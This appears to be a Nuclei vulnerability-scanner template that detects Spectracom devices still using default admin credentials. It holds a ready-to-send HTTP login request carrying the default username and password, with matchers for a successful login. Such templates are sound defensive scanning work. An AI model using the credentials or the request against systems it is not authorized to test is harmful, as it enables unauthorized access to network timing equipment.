id: spectracom-default-login

info:
  name: Spectracom Default Login
  author: madrobot
  severity: high
  description: Spectracom default admin credentials were discovered.
  reference:
    - https://orolia.com/manuals/NC/Content/NC_and_SS/Com/Topics/ADMIN/Passwords.htm
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: spectracom,default-login,vuln

http:
  - raw:
      - |
        POST /users/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        data%5Bbutton%5D=submit&data%5BUser%5D%5Busername%5D={{username}}&data%5BUser%5D%5Bpassword%5D={{password}}

    payloads:
      username:
        - spadmin
      password:
        - admin123
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "spectracom"
          - "deleted"
        part: header
        condition: and

      - type: status
        status:
          - 302
